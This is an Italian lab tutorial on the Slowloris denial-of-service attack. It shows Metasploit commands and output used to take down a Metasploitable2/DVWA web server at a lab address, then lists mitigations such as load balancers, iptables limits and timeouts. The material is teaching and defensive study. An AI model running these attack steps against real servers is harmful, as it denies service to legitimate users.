# Slowloris

Introduciamo in questa sezione un particolare attacco di tipo Denial of Service ad un web server. 

Un Denial of Service indica un attacco in cui si vanno ad esaurire le risorse di un sistema informatico che fornisce un servizio fino a renderlo completamente inutilizzabile dai client. Dunque, tale tipologia di attacco va a minare l'availability di un servizio. 

Una metodologia standard per andare ad intaccare l'availability di un web server con un attacco DoS è aprire quante più richieste possibili verso di esso che andranno così a consumare tutte le risorse fino a rendere il server non più accessibile. 

Lo slowloris effettua un DoS in modo leggermente diverso, esso va a minare l'availability di un server utilizzando delle richieste http che sono appunto lente. 

In particolare, tale attacco cerca di mantenere quante più connessioni attive verso il web server target. Questo è possibile aprendo delle connessioni verso il target e inviando delle richieste parziali, periodicamente su tale connessione si va ad aggiungere qualcosa alla richiesta senza però mai portarla a termine. L'effetto di tutto ciò sarà che il server terrà aperte queste connessioni, andando a raggiungere la soglia di connessioni concorrenti e negandone di nuove da altri client. 

Possiamo accedere al nostro web server, che si trova sulla macchina metasploitable2, da un browser di ricerca e digitando l'indirizzo IP, da qui apriamo una pagina della Damn Vulnerable Web Application (DVWA). Tale web server sarà available e responsivo. 

<img src="/imgs/WebServer1.PNG" width="600"> </br>

Di seguito, l'interfaccia di DVMA:

<img src="/imgs/DVWA.PNG" width="600"> </br>


Procediamo ora all'attacco tramite metasploit. Avviata la msfconsole ricerchiamo un modulo built in per l'attacco slowloris digitando il conmando `search slowloris`.

```
Matching Modules
================

   #  Name                          Disclosure Date  Rank    Check  Description
   -  ----                          ---------------  ----    -----  -----------
   0  auxiliary/dos/http/slowloris  2009-06-17       normal  No     Slowloris Denial of Service Attack


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/dos/http/slowloris

```
Selezioniamo il modulo e con `show options` visioniamo le varie opzioni del payload di attacco.

```
msf6 > use auxiliary/dos/http/slowloris 
msf6 auxiliary(dos/http/slowloris) > show options

Module options (auxiliary/dos/http/slowloris):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   delay            15               yes       The delay between sending keep-alive headers
   rand_user_agent  true             yes       Randomizes user-agent with each request
   rhost                             yes       The target address
   rport            80               yes       The target port
   sockets          150              yes       The number of sockets to use in the attack
   ssl              false            yes       Negotiate SSL/TLS for outgoing connections

```
L'unica cosa da configurare in questo caso è `rhost`.  Settiamo questo campo con l'ip target ed ora sarà possibile tramite il comando `exploit` far partire l'attacco.

```
msf6 auxiliary(dos/http/slowloris) > set rhost 192.168.198.4
rhost => 192.168.198.4
msf6 auxiliary(dos/http/slowloris) > show options

Module options (auxiliary/dos/http/slowloris):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   delay            15               yes       The delay between sending keep-alive headers
   rand_user_agent  true             yes       Randomizes user-agent with each request
   rhost            192.168.198.4    yes       The target address
   rport            80               yes       The target port
   sockets          150              yes       The number of sockets to use in the attack
   ssl              false            yes       Negotiate SSL/TLS for outgoing connections
   
msf6 auxiliary(dos/http/slowloris) > exploit

[*] Starting server...
[*] Attacking 192.168.198.4 with 150 sockets
[*] Creating sockets...
[*] Sending keep-alive headers... Socket count: 150

```

Se ora proviamo ad utilizzare la nostra web application non riusciremo ad essere serviti da essa in quanto l'attacco appena lanciato sta andando a logorare le risorse. 

<img src="/imgs/slowloris.png" width="600"> </br>


Tale attacco proseguirà fin quando non lo terminiamo da msfconsole con `ctrl+c`. 

```
^C[-] Stopping running against current target...
[*] Control-C again to force quit all targets.
[*] Auxiliary module execution completed

```

Una volta interrotto l'attacco la web application tornerà available e responsiva come mostrato di seguito:

<img src="/imgs/postslowloris.png" width="600"> </br>

## Rimedi e prevenzione allo Slowloris

Per mitigare gli effetti di un attacco di tipo Slowloris o evitarli del tutto è possibile attuare una serie di strategie. 

Una soluzione completa può essere quella di utilizzare un hardware load balancer che accetti solo conessioni http complete e dunque andando a configurare un load balancer possiamo del tutto evitare delle richieste http incomplete come quelle messe in atto da slowloris.

Secondariamente, è possibile, tramite IPtables limitare le conessioni che provengono da un host particolare.

Infine, possono essere implementati all'interno della web application specifici pacchetti che vanno a settare in maniera opportuna il timeout necessario tra una richiesta e l'altra per abbattere una connessione lenta. 
